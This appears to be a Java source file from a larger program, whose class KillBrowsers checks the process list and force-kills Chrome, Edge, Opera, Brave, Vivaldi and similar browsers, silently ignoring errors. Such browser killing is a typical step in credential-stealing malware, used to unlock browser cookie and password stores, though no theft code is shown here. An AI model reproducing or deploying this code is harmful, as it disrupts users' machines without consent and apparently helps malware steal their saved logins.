package io.github.luxotick.impl;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class KillBrowsers {
    public static void kill(){
        String[] blacklistedProcceses = {
                "chrome.exe", "msedge.exe", "opera.exe", "vivaldi.exe", "browser.exe", "operagx.exe", "brave.exe", "edge.exe"};
        final StringBuilder builder = new StringBuilder();
        try {
            final BufferedReader reader = new BufferedReader(new InputStreamReader(new ProcessBuilder("tasklist").start().getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                builder.append(line).append("\n");
            }
        } catch (IOException ex) {}
        String processes = builder.toString();
        try{
            for (String process : blacklistedProcceses) {
                if (processes.contains(process)) {
                    ProcessBuilder pb = new ProcessBuilder("taskkill", "/F", "/IM", process);
                    pb.start();
                    Thread.sleep(2000);
                }
            }
        }
        catch(IOException e){} catch (InterruptedException e) {
        }
    }


}
